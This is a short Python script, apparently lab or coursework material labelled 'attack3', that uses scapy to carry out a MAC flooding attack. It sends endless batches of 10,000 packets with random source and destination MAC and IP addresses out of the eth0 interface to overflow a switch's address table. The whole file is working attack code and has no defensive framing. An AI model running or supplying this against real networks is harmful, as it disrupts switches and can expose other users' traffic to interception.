#attack3
import random 
from scapy.all import *

print('starting MAC flooding attack...')

def Hex():
    return random.choice(['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'])

def generateMac():
    return '%s%s:%s%s:%s%s:%s%s:%s%s:%s%s' % (Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex())

while True:
    list = []
    for i in range(10000):
        packet = Ether(src=generateMac(),dst=generateMac())/IP(src=RandIP(),dst=RandIP())
        list.append(packet)
    print('sending 10000 packets...')
    sendp(list, iface='eth0')

print('exiting program')